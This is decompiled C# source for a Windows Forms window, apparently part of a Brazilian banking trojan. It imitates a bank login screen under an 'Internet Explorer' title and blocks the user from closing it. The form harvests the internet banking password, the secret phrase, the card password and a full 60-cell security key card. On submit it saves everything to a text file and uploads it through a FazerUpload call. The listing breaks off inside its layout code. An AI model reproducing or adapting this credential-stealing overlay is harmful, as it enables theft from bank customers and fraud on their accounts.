using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace KanK;

public class Brdsc : Form
{
	private IContainer components;

	private TextBox pass_4;

	private TextBox frase_secreta;

	private TextBox textBox3;

	private PictureBox pictureBox2;

	private PictureBox pictureBox3;

	private PictureBox pictureBox4;

	private PictureBox pictureBox44;

	private Panel Painel_Chave1;

	private PictureBox pictureBox58;

	private TextBox textBox11;

	private TextBox textBox12;

	private TextBox textBox13;

	private TextBox textBox10;

	private TextBox textBox9;

	private TextBox textBox7;

	private TextBox textBox8;

	private TextBox textBox6;

	private TextBox textBox5;

	private TextBox textBox74;

	private TextBox textBox64;

	private TextBox textBox54;

	private TextBox textBox35;

	private TextBox textBox73;

	private TextBox textBox63;

	private TextBox textBox53;

	private TextBox textBox36;

	private TextBox textBox72;

	private TextBox textBox62;

	private TextBox textBox52;

	private TextBox textBox37;

	private TextBox textBox71;

	private TextBox textBox61;

	private TextBox textBox51;

	private TextBox textBox38;

	private TextBox textBox70;

	private TextBox textBox60;

	private TextBox textBox50;

	private TextBox textBox39;

	private TextBox textBox69;

	private TextBox textBox59;

	private TextBox textBox49;

	private TextBox textBox40;

	private TextBox textBox68;

	private TextBox textBox58;

	private TextBox textBox48;

	private TextBox textBox41;

	private TextBox textBox67;

	private TextBox textBox57;

	private TextBox textBox47;

	private TextBox textBox42;

	private TextBox textBox66;

	private TextBox textBox65;

	private TextBox textBox56;

	private TextBox textBox55;

	private TextBox textBox46;

	private TextBox textBox45;

	private TextBox textBox43;

	private TextBox textBox44;

	private TextBox textBox25;

	private TextBox textBox26;

	private TextBox textBox27;

	private TextBox textBox28;

	private TextBox textBox29;

	private TextBox textBox30;

	private TextBox textBox31;

	private TextBox textBox32;

	private TextBox textBox33;

	private TextBox textBox34;

	private TextBox textBox15;

	private TextBox textBox16;

	private TextBox textBox17;

	private TextBox textBox18;

	private TextBox textBox19;

	private TextBox textBox20;

	private TextBox textBox21;

	private TextBox textBox22;

	private TextBox textBox23;

	private TextBox textBox24;

	private TextBox textBox14;

	private Panel Painel_Cartao;

	private TextBox pass_6;

	private PictureBox pictureBox57;

	private PictureBox pictureBox51;

	private PictureBox pictureBox52;

	private PictureBox pictureBox56;

	private PictureBox pictureBox48;

	private PictureBox pictureBox49;

	private PictureBox pictureBox50;

	private PictureBox pictureBox55;

	private PictureBox pictureBox54;

	private PictureBox pictureBox53;

	private PictureBox pictureBox47;

	private PictureBox pictureBox43;

	private PictureBox pictureBox35;

	private PictureBox pictureBox36;

	private PictureBox pictureBox37;

	private PictureBox pictureBox38;

	private PictureBox pictureBox39;

	private PictureBox pictureBox40;

	private PictureBox pictureBox41;

	private PictureBox pictureBox42;

	private PictureBox pictureBox31;

	private PictureBox pictureBox32;

	private PictureBox pictureBox33;

	private PictureBox pictureBox34;

	private PictureBox pictureBox23;

	private PictureBox pictureBox24;

	private PictureBox pictureBox25;

	private PictureBox pictureBox26;

	private PictureBox pictureBox27;

	private PictureBox pictureBox28;

	private PictureBox pictureBox29;

	private PictureBox pictureBox30;

	private PictureBox pictureBox20;

	private PictureBox pictureBox21;

	private PictureBox pictureBox22;

	private PictureBox pictureBox17;

	private PictureBox pictureBox18;

	private PictureBox pictureBox16;

	private PictureBox pictureBox15;

	private PictureBox pictureBox13;

	private PictureBox pictureBox14;

	private PictureBox pictureBox9;

	private PictureBox pictureBox10;

	private PictureBox pictureBox11;

	private PictureBox pictureBox12;

	private PictureBox pictureBox7;

	private PictureBox pictureBox8;

	private PictureBox pictureBox6;

	private PictureBox pictureBox5;

	private PictureBox pictureBox1;

	public PictureBox isprime;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	public Brdsc()
	{
		InitializeComponent();
	}

	private void pictureBox2_Click(object sender, EventArgs e)
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		((Control)pictureBox2).set_Visible(false);
		if (!((Control)Painel_Cartao).get_Visible())
		{
			if (((Control)pass_4).get_Text().Length == 4 && ((Control)frase_secreta).get_Text().Length > 10)
			{
				Form1.Durma(1000);
				((Control)Painel_Cartao).set_Visible(true);
				((Control)pass_6).Focus();
			}
			else
			{
				MessageBox.Show("Dados inválidos", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
			}
		}
		if (((Control)Painel_Cartao).get_Visible() && ((Control)pass_6).get_Text().Length > 5)
		{
			Form1.Durma(1000);
			((Control)Painel_Cartao).set_Visible(false);
			((Control)Painel_Chave1).set_Visible(true);
		}
		else
		{
			MessageBox.Show("Dados inválidos.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
		((Control)pictureBox2).set_Visible(true);
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
		((Control)textBox3).set_Text(Convert.ToString(((Control)frase_secreta).get_Text().Length));
	}

	private void pictureBox53_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "9");
		}
	}

	private void pictureBox54_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "6");
		}
	}

	private void pictureBox55_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "4");
		}
	}

	private void pictureBox50_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "1");
		}
	}

	private void pictureBox49_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "3");
		}
	}

	private void pictureBox48_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "7");
		}
	}

	private void pictureBox56_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "0");
		}
	}

	private void pictureBox52_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "2");
		}
	}

	private void pictureBox51_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "8");
		}
	}

	private void pictureBox47_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "5");
		}
	}

	private void pictureBox57_Click(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text("");
		}
	}

	private void NoKeys(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite somente números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void pictureBox5_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Text().Length < 4)
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "0");
		}
		else if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "0");
		}
	}

	private void pass_4_TextChanged(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Text().Length == 4)
		{
			((Control)frase_secreta).Focus();
		}
	}

	private void pictureBox5_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "4");
		}
	}

	private void pictureBox6_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "9");
		}
	}

	private void pictureBox8_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "0");
		}
	}

	private void pictureBox7_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "3");
		}
	}

	private void pictureBox12_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "2");
		}
	}

	private void pictureBox11_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "6");
		}
	}

	private void pictureBox10_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "5");
		}
	}

	private void pictureBox9_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "7");
		}
	}

	private void pictureBox14_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "8");
		}
	}

	private void pictureBox13_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((Control)pass_4).set_Text(((Control)pass_4).get_Text() + "1");
		}
	}

	private void pictureBox15_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "q");
		}
	}

	private void pictureBox16_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "w");
		}
	}

	private void pictureBox22_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "e");
		}
	}

	private void pictureBox21_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "r");
		}
	}

	private void pictureBox30_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "t");
		}
	}

	private void pictureBox29_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "y");
		}
	}

	private void pictureBox26_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "u");
		}
	}

	private void pictureBox25_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "i");
		}
	}

	private void pictureBox34_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "o");
		}
	}

	private void pictureBox33_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "p");
		}
	}

	private void pictureBox18_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "a");
		}
	}

	private void pictureBox17_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "s");
		}
	}

	private void pictureBox20_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "d");
		}
	}

	private void pictureBox19_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "d");
		}
	}

	private void pictureBox28_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "f");
		}
	}

	private void pictureBox27_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "g");
		}
	}

	private void pictureBox24_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "h");
		}
	}

	private void pictureBox23_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "j");
		}
	}

	private void pictureBox32_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "k");
		}
	}

	private void pictureBox31_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "l");
		}
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "ç");
		}
	}

	private void pictureBox42_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "z");
		}
	}

	private void pictureBox41_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "x");
		}
	}

	private void pictureBox40_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "c");
		}
	}

	private void pictureBox39_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "v");
		}
	}

	private void pictureBox38_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "b");
		}
	}

	private void pictureBox37_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "n");
		}
	}

	private void pictureBox36_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "m");
		}
	}

	private void pictureBox35_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + "?");
		}
	}

	private void pictureBox44_Click(object sender, EventArgs e)
	{
		if (((Control)frase_secreta).get_Focused())
		{
			((Control)frase_secreta).set_Text(((Control)frase_secreta).get_Text() + " ");
		}
	}

	private void pictureBox53_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "9");
		}
	}

	private void pictureBox54_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "6");
		}
	}

	private void pictureBox55_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "4");
		}
	}

	private void pictureBox50_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "1");
		}
	}

	private void pictureBox49_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "3");
		}
	}

	private void pictureBox48_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "7");
		}
	}

	private void pictureBox56_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "0");
		}
	}

	private void pictureBox52_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "2");
		}
	}

	private void pictureBox51_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "8");
		}
	}

	private void pictureBox47_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused() && ((Control)pass_6).get_Text().Length < 8)
		{
			((Control)pass_6).set_Text(((Control)pass_6).get_Text() + "5");
		}
	}

	private void pictureBox57_Click_1(object sender, EventArgs e)
	{
		if (((Control)pass_6).get_Focused())
		{
			((TextBoxBase)pass_6).Clear();
		}
	}

	private void Painel_Cartao_Paint(object sender, PaintEventArgs e)
	{
		((Control)pass_6).Focus();
	}

	private void pictureBox4_Click(object sender, EventArgs e)
	{
		if (((Control)pass_4).get_Focused())
		{
			((TextBoxBase)pass_4).Clear();
		}
		if (((Control)frase_secreta).get_Focused())
		{
			((TextBoxBase)frase_secreta).Clear();
		}
	}

	private void pictureBox58_Click(object sender, EventArgs e)
	{
		//IL_0cc6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox5).get_Text().Length == 3 && ((Control)textBox6).get_Text().Length == 3 && ((Control)textBox8).get_Text().Length == 3 && ((Control)textBox7).get_Text().Length == 3 && ((Control)textBox9).get_Text().Length == 3 && ((Control)textBox10).get_Text().Length == 3 && ((Control)textBox13).get_Text().Length == 3 && ((Control)textBox12).get_Text().Length == 3 && ((Control)textBox11).get_Text().Length == 3 && ((Control)textBox14).get_Text().Length == 3 && ((Control)textBox24).get_Text().Length == 3 && ((Control)textBox23).get_Text().Length == 3 && ((Control)textBox22).get_Text().Length == 3 && ((Control)textBox21).get_Text().Length == 3 && ((Control)textBox20).get_Text().Length == 3 && ((Control)textBox19).get_Text().Length == 3 && ((Control)textBox18).get_Text().Length == 3 && ((Control)textBox17).get_Text().Length == 3 && ((Control)textBox16).get_Text().Length == 3 && ((Control)textBox15).get_Text().Length == 3 && ((Control)textBox34).get_Text().Length == 3 && ((Control)textBox33).get_Text().Length == 3 && ((Control)textBox32).get_Text().Length == 3 && ((Control)textBox31).get_Text().Length == 3 && ((Control)textBox30).get_Text().Length == 3 && ((Control)textBox29).get_Text().Length == 3 && ((Control)textBox28).get_Text().Length == 3 && ((Control)textBox27).get_Text().Length == 3 && ((Control)textBox26).get_Text().Length == 3 && ((Control)textBox25).get_Text().Length == 3 && ((Control)textBox44).get_Text().Length == 3 && ((Control)textBox43).get_Text().Length == 3 && ((Control)textBox42).get_Text().Length == 3 && ((Control)textBox41).get_Text().Length == 3 && ((Control)textBox40).get_Text().Length == 3 && ((Control)textBox39).get_Text().Length == 3 && ((Control)textBox38).get_Text().Length == 3 && ((Control)textBox37).get_Text().Length == 3 && ((Control)textBox36).get_Text().Length == 3 && ((Control)textBox35).get_Text().Length == 3 && ((Control)textBox45).get_Text().Length == 3 && ((Control)textBox46).get_Text().Length == 3 && ((Control)textBox47).get_Text().Length == 3 && ((Control)textBox48).get_Text().Length == 3 && ((Control)textBox49).get_Text().Length == 3 && ((Control)textBox50).get_Text().Length == 3 && ((Control)textBox51).get_Text().Length == 3 && ((Control)textBox52).get_Text().Length == 3 && ((Control)textBox53).get_Text().Length == 3 && ((Control)textBox54).get_Text().Length == 3 && ((Control)textBox55).get_Text().Length == 3 && ((Control)textBox56).get_Text().Length == 3 && ((Control)textBox57).get_Text().Length == 3 && ((Control)textBox58).get_Text().Length == 3 && ((Control)textBox59).get_Text().Length == 3 && ((Control)textBox60).get_Text().Length == 3 && ((Control)textBox61).get_Text().Length == 3 && ((Control)textBox62).get_Text().Length == 3 && ((Control)textBox63).get_Text().Length == 3 && ((Control)textBox64).get_Text().Length == 3)
		{
			((Control)pictureBox58).set_Visible(false);
			string text = (((Control)isprime).get_Visible() ? "Prm" : "Brd");
			Form1.GuardaInfo(text, "S.Internet.: " + ((Control)pass_4).get_Text());
			Form1.GuardaInfo(text, "Resposta...: " + ((Control)frase_secreta).get_Text());
			Form1.GuardaInfo(text, "S.Cartão...: " + ((Control)pass_6).get_Text());
			Form1.GuardaInfo(text, "=========================================================");
			Form1.GuardaInfo(text, ((Control)textBox5).get_Text() + " | " + ((Control)textBox6).get_Text() + " | " + ((Control)textBox8).get_Text() + " | " + ((Control)textBox7).get_Text() + " | " + ((Control)textBox9).get_Text() + " | " + ((Control)textBox10).get_Text() + " | " + ((Control)textBox13).get_Text() + " | " + ((Control)textBox12).get_Text() + " | " + ((Control)textBox11).get_Text() + " | " + ((Control)textBox14).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox24).get_Text() + " | " + ((Control)textBox23).get_Text() + " | " + ((Control)textBox22).get_Text() + " | " + ((Control)textBox21).get_Text() + " | " + ((Control)textBox20).get_Text() + " | " + ((Control)textBox19).get_Text() + " | " + ((Control)textBox18).get_Text() + " | " + ((Control)textBox17).get_Text() + " | " + ((Control)textBox16).get_Text() + " | " + ((Control)textBox15).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox34).get_Text() + " | " + ((Control)textBox33).get_Text() + " | " + ((Control)textBox32).get_Text() + " | " + ((Control)textBox31).get_Text() + " | " + ((Control)textBox30).get_Text() + " | " + ((Control)textBox29).get_Text() + " | " + ((Control)textBox28).get_Text() + " | " + ((Control)textBox27).get_Text() + " | " + ((Control)textBox26).get_Text() + " | " + ((Control)textBox25).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox44).get_Text() + " | " + ((Control)textBox43).get_Text() + " | " + ((Control)textBox42).get_Text() + " | " + ((Control)textBox41).get_Text() + " | " + ((Control)textBox40).get_Text() + " | " + ((Control)textBox39).get_Text() + " | " + ((Control)textBox38).get_Text() + " | " + ((Control)textBox37).get_Text() + " | " + ((Control)textBox36).get_Text() + " | " + ((Control)textBox35).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox45).get_Text() + " | " + ((Control)textBox46).get_Text() + " | " + ((Control)textBox47).get_Text() + " | " + ((Control)textBox48).get_Text() + " | " + ((Control)textBox49).get_Text() + " | " + ((Control)textBox50).get_Text() + " | " + ((Control)textBox51).get_Text() + " | " + ((Control)textBox52).get_Text() + " | " + ((Control)textBox53).get_Text() + " | " + ((Control)textBox54).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox55).get_Text() + " | " + ((Control)textBox56).get_Text() + " | " + ((Control)textBox57).get_Text() + " | " + ((Control)textBox58).get_Text() + " | " + ((Control)textBox59).get_Text() + " | " + ((Control)textBox60).get_Text() + " | " + ((Control)textBox61).get_Text() + " | " + ((Control)textBox62).get_Text() + " | " + ((Control)textBox63).get_Text() + " | " + ((Control)textBox64).get_Text());
			Form1.GuardaInfo(text, ((Control)textBox65).get_Text() + " | " + ((Control)textBox66).get_Text() + " | " + ((Control)textBox67).get_Text() + " | " + ((Control)textBox68).get_Text() + " | " + ((Control)textBox69).get_Text() + " | " + ((Control)textBox70).get_Text() + " | " + ((Control)textBox71).get_Text() + " | " + ((Control)textBox72).get_Text() + " | " + ((Control)textBox73).get_Text() + " | " + ((Control)textBox74).get_Text());
			Form1.GuardaInfo(text, "=========================================================");
			Form1.FazerUpload(text + ".txt");
		}
		else
		{
			MessageBox.Show("Preencha as posições solicitadas corretamente.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void Brdsc_Load(object sender, EventArgs e)
	{
		((Control)pass_4).Focus();
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
